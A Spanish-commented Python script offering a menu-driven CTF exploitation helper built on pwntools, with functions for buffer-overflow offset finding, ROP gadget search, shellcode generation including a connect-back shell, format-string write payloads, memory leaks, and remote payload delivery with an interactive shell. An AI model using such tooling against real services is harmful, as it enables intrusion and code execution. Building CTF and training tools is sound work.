#!/usr/bin/env python3
"""
PWN CTF Tool - Herramienta completa para explotación binaria en CTFs
"""

import struct
import socket
import subprocess
import sys
import os

# Intentar importar pwntools
try:
    from pwn import *
    PWNTOOLS_AVAILABLE = True
except ImportError:
    PWNTOOLS_AVAILABLE = False
    print("[-] pwntools no está instalado. Instálalo con: pip install pwntools")
    print("[-] Algunas funcionalidades estarán limitadas sin pwntools")

class PWNTool:
    def __init__(self):
        self.target = None
        self.process = None
        self.remote_conn = None
        
        if not PWNTOOLS_AVAILABLE:
            print("[-] Advertencia: pwntools no disponible. Funcionalidad limitada.")
        
    def connect_local(self, binary_path, args=None):
        """Conectar a un binario local"""
        if not PWNTOOLS_AVAILABLE:
            print("[-] Esta función requiere pwntools. Instálalo con: pip install pwntools")
            return False
            
        try:
            if args:
                self.process = process([binary_path] + args)
            else:
                self.process = process(binary_path)
            self.target = self.process
            print(f"[+] Conectado al binario local: {binary_path}")
            return True
        except Exception as e:
            print(f"[-] Error conectando al binario: {e}")
            return False
    
    def connect_remote(self, host, port):
        """Conectar a un servicio remoto"""
        if not PWNTOOLS_AVAILABLE:
            print("[-] Esta función requiere pwntools. Instálalo con: pip install pwntools")
            return False
            
        try:
            self.remote_conn = remote(host, port)
            self.target = self.remote_conn
            print(f"[+] Conectado a {host}:{port}")
            return True
        except Exception as e:
            print(f"[-] Error conectando al servidor: {e}")
            return False
    
    def find_offset(self, binary_path, max_length=200):
        """Encontrar offset para buffer overflow usando patrón cíclico"""
        print("[*] Buscando offset para buffer overflow...")
        
        pattern = cyclic(max_length)
        
        try:
            p = process(binary_path)
            p.sendline(pattern)
            p.wait()
            
            core = p.corefile
            stack = core.rsp
            info = core.read(stack, 8)
            
            offset = cyclic_find(info)
            print(f"[+] Offset encontrado: {offset}")
            return offset
            
        except Exception as e:
            print(f"[-] Error encontrando offset: {e}")
            return None
    
    def generate_rop_chain(self, binary_path, gadgets_list=None):
        """Generar cadena ROP básica"""
        print("[*] Generando cadena ROP...")
        
        try:
            elf = ELF(binary_path)
            rop = ROP(elf)
            
            if gadgets_list:
                for gadget in gadgets_list:
                    rop.raw(gadget)
            
            print(f"[+] Cadena ROP generada: {len(rop.chain())} bytes")
            return rop.chain()
            
        except Exception as e:
            print(f"[-] Error generando ROP: {e}")
            return None
    
    def find_gadgets(self, binary_path, gadget_type="ret"):
        """Buscar gadgets ROP en el binario"""
        print(f"[*] Buscando gadgets '{gadget_type}'...")
        
        try:
            elf = ELF(binary_path)
            rop = ROP(elf)
            
            if gadget_type == "ret":
                gadgets = rop.find_gadget(['ret'])
            elif gadget_type == "pop_rdi":
                gadgets = rop.find_gadget(['pop rdi', 'ret'])
            elif gadget_type == "pop_rsi":
                gadgets = rop.find_gadget(['pop rsi', 'ret'])
            else:
                gadgets = rop.search(move=0, regs=gadget_type)
            
            print(f"[+] Gadgets encontrados: {hex(gadgets)}")
            return gadgets
            
        except Exception as e:
            print(f"[-] Error buscando gadgets: {e}")
            return None
    
    def generate_shellcode(self, arch="amd64", shell_type="sh"):
        """Generar shellcode para diferentes arquitecturas"""
        print(f"[*] Generando shellcode para {arch}...")
        
        try:
            context.arch = arch
            
            if shell_type == "sh":
                shellcode = asm(shellcraft.sh())
            elif shell_type == "execve":
                shellcode = asm(shellcraft.execve('/bin/sh'))
            elif shell_type == "connect_back":
                shellcode = asm(shellcraft.connect('127.0.0.1', 4444) + shellcraft.sh())
            
            print(f"[+] Shellcode generado: {len(shellcode)} bytes")
            print(f"[+] Hex: {shellcode.hex()}")
            return shellcode
            
        except Exception as e:
            print(f"[-] Error generando shellcode: {e}")
            return None
    
    def leak_memory(self, address, length=8):
        """Filtrar memoria desde una dirección específica"""
        if not self.target:
            print("[-] No hay conexión activa")
            return None
            
        try:
            payload = f"%{length}$s".encode() + p64(address)
            self.target.sendline(payload)
            
            response = self.target.recv()
            print(f"[+] Memoria filtrada desde {hex(address)}: {response}")
            return response
            
        except Exception as e:
            print(f"[-] Error filtrando memoria: {e}")
            return None
    
    def format_string_exploit(self, offset, target_addr, value):
        """Generar exploit de format string"""
        print(f"[*] Generando exploit format string...")
        
        try:
            payload = fmtstr_payload(offset, {target_addr: value})
            print(f"[+] Payload format string: {len(payload)} bytes")
            return payload
            
        except Exception as e:
            print(f"[-] Error generando format string: {e}")
            return None
    
    def send_payload(self, payload):
        """Enviar payload al objetivo"""
        if not self.target:
            print("[-] No hay conexión activa")
            return False
            
        try:
            self.target.sendline(payload)
            print(f"[+] Payload enviado: {len(payload)} bytes")
            return True
            
        except Exception as e:
            print(f"[-] Error enviando payload: {e}")
            return False
    
    def interactive_shell(self):
        """Obtener shell interactiva"""
        if not self.target:
            print("[-] No hay conexión activa")
            return
            
        try:
            print("[+] Obteniendo shell interactiva...")
            self.target.interactive()
            
        except Exception as e:
            print(f"[-] Error obteniendo shell: {e}")
    
    def close_connection(self):
        """Cerrar conexión"""
        try:
            if self.process:
                self.process.close()
            if self.remote_conn:
                self.remote_conn.close()
            print("[+] Conexión cerrada")
            
        except Exception as e:
            print(f"[-] Error cerrando conexión: {e}")
    
    def create_pattern(self, length=200):
        """Crear patrón cíclico para encontrar offsets"""
        if not PWNTOOLS_AVAILABLE:
            print("[-] Esta función requiere pwntools")
            return None
        
        try:
            pattern = cyclic(length)
            print(f"[+] Patrón cíclico creado: {length} bytes")
            print(f"[+] Patrón: {pattern.decode()}")
            return pattern
        except Exception as e:
            print(f"[-] Error creando patrón: {e}")
            return None
    
    def find_pattern_offset(self, pattern_match):
        """Encontrar offset desde un match de patrón"""
        if not PWNTOOLS_AVAILABLE:
            print("[-] Esta función requiere pwntools")
            return None
        
        try:
            if isinstance(pattern_match, str):
                pattern_match = pattern_match.encode()
            offset = cyclic_find(pattern_match)
            print(f"[+] Offset encontrado: {offset}")
            return offset
        except Exception as e:
            print(f"[-] Error encontrando offset: {e}")
            return None
    
    def generate_nop_sled(self, length=100, arch="amd64"):
        """Generar NOP sled"""
        if not PWNTOOLS_AVAILABLE:
            print("[-] Esta función requiere pwntools")
            return None
        
        try:
            context.arch = arch
            if arch == "amd64" or arch == "i386":
                nop_sled = b"\x90" * length
            elif arch == "arm":
                nop_sled = b"\x00\x00\xa0\xe1" * (length // 4)
            else:
                nop_sled = b"\x90" * length
            
            print(f"[+] NOP sled generado: {length} bytes para {arch}")
            return nop_sled
        except Exception as e:
            print(f"[-] Error generando NOP sled: {e}")
            return None
    
    def pack_address(self, address, arch="amd64"):
        """Empaquetar dirección según arquitectura"""
        if not PWNTOOLS_AVAILABLE:
            print("[-] Esta función requiere pwntools")
            return None
        
        try:
            if arch == "amd64":
                packed = p64(address)
            elif arch == "i386":
                packed = p32(address)
            else:
                packed = p64(address)  # default
            
            print(f"[+] Dirección empaquetada: 0x{address:x} -> {packed.hex()}")
            return packed
        except Exception as e:
            print(f"[-] Error empaquetando dirección: {e}")
            return None

def install_pwntools():
    """Instalar pwntools automáticamente"""
    print("[*] Intentando instalar pwntools...")
    try:
        import subprocess
        result = subprocess.run([sys.executable, "-m", "pip", "install", "pwntools"], 
                              capture_output=True, text=True)
        if result.returncode == 0:
            print("[+] pwntools instalado exitosamente!")
            print("[*] Por favor, reinicia el programa para usar todas las funcionalidades.")
            return True
        else:
            print(f"[-] Error instalando pwntools: {result.stderr}")
            return False
    except Exception as e:
        print(f"[-] Error durante la instalación: {e}")
        return False

def main():
    """Función principal con menú interactivo"""
    pwn_tool = PWNTool()
    
    print("=" * 50)
    print("    PWN CTF Tool - Herramienta de Explotación")
    print("=" * 50)
    
    while True:
        print("\n[MENÚ PRINCIPAL]")
        if not PWNTOOLS_AVAILABLE:
            print("⚠️  Instalar pwntools (requerido)")
        print("1. Conectar a binario local")
        print("2. Conectar a servicio remoto")
        print("3. Encontrar offset (buffer overflow)")
        print("4. Buscar gadgets ROP")
        print("5. Generar shellcode")
        print("6. Exploit format string")
        print("7. Enviar payload personalizado")
        print("8. Shell interactiva")
        print("9. Cerrar conexión")
        print("10. Crear patrón cíclico")
        print("11. Encontrar offset desde patrón")
        print("12. Generar NOP sled")
        print("13. Empaquetar dirección")
        print("0. Salir")
        
        choice = input("\nSelecciona una opción: ").strip()
        
        if choice == "i" and not PWNTOOLS_AVAILABLE:
            install_pwntools()
            
        elif choice == "1":
            binary = input("Ruta del binario: ").strip()
            pwn_tool.connect_local(binary)
            
        elif choice == "2":
            host = input("Host: ").strip()
            port = int(input("Puerto: ").strip())
            pwn_tool.connect_remote(host, port)
            
        elif choice == "3":
            binary = input("Ruta del binario: ").strip()
            if not binary:
                print("[-] Ruta del binario requerida")
                continue
            max_len_input = input("Longitud máxima (200): ").strip()
            max_len = int(max_len_input) if max_len_input else 200
            pwn_tool.find_offset(binary, max_len)
            
        elif choice == "4":
            binary = input("Ruta del binario: ").strip()
            if not binary:
                print("[-] Ruta del binario requerida")
                continue
            gadget_type = input("Tipo de gadget (ret/pop_rdi/pop_rsi): ").strip() or "ret"
            pwn_tool.find_gadgets(binary, gadget_type)
            
        elif choice == "5":
            arch = input("Arquitectura (amd64/i386): ").strip() or "amd64"
            shell_type = input("Tipo (sh/execve/connect_back): ").strip() or "sh"
            shellcode = pwn_tool.generate_shellcode(arch, shell_type)
            
        elif choice == "6":
            try:
                offset_input = input("Offset format string: ").strip()
                if not offset_input:
                    print("[-] Offset requerido")
                    continue
                offset = int(offset_input)
                
                addr_input = input("Dirección objetivo (hex): ").strip()
                if not addr_input:
                    print("[-] Dirección requerida")
                    continue
                target_addr = int(addr_input, 16)
                
                value_input = input("Valor a escribir: ").strip()
                if not value_input:
                    print("[-] Valor requerido")
                    continue
                value = int(value_input)
                
                payload = pwn_tool.format_string_exploit(offset, target_addr, value)
                if payload:
                    pwn_tool.send_payload(payload)
            except ValueError as e:
                print(f"[-] Error en los valores ingresados: {e}")
                
        elif choice == "7":
            payload = input("Payload (hex): ").strip()
            try:
                payload_bytes = bytes.fromhex(payload)
                pwn_tool.send_payload(payload_bytes)
            except ValueError:
                payload_bytes = payload.encode()
                pwn_tool.send_payload(payload_bytes)
                
        elif choice == "8":
            pwn_tool.interactive_shell()
            
        elif choice == "9":
            pwn_tool.close_connection()
            
        elif choice == "10":
            length_input = input("Longitud del patrón (200): ").strip()
            length = int(length_input) if length_input else 200
            pattern = pwn_tool.create_pattern(length)
            
        elif choice == "11":
            pattern_match = input("Patrón encontrado (hex o string): ").strip()
            if not pattern_match:
                print("[-] Patrón requerido")
                continue
            try:
                # Intentar como hex primero
                if pattern_match.startswith("0x"):
                    pattern_match = bytes.fromhex(pattern_match[2:])
                elif all(c in '0123456789abcdefABCDEF' for c in pattern_match):
                    pattern_match = bytes.fromhex(pattern_match)
                else:
                    pattern_match = pattern_match.encode()
            except:
                pattern_match = pattern_match.encode()
            pwn_tool.find_pattern_offset(pattern_match)
            
        elif choice == "12":
            length_input = input("Longitud del NOP sled (100): ").strip()
            length = int(length_input) if length_input else 100
            arch = input("Arquitectura (amd64/i386/arm): ").strip() or "amd64"
            nop_sled = pwn_tool.generate_nop_sled(length, arch)
            if nop_sled:
                print(f"[+] NOP sled hex: {nop_sled.hex()}")
                
        elif choice == "13":
            try:
                addr_input = input("Dirección (hex): ").strip()
                if not addr_input:
                    print("[-] Dirección requerida")
                    continue
                address = int(addr_input, 16)
                arch = input("Arquitectura (amd64/i386): ").strip() or "amd64"
                packed = pwn_tool.pack_address(address, arch)
                if packed:
                    print(f"[+] Dirección empaquetada hex: {packed.hex()}")
            except ValueError as e:
                print(f"[-] Error en la dirección: {e}")
                
        elif choice == "0":
            pwn_tool.close_connection()
            print("¡Hasta luego!")
            break
            
        else:
            print("[-] Opción inválida")

if __name__ == "__main__":
    main()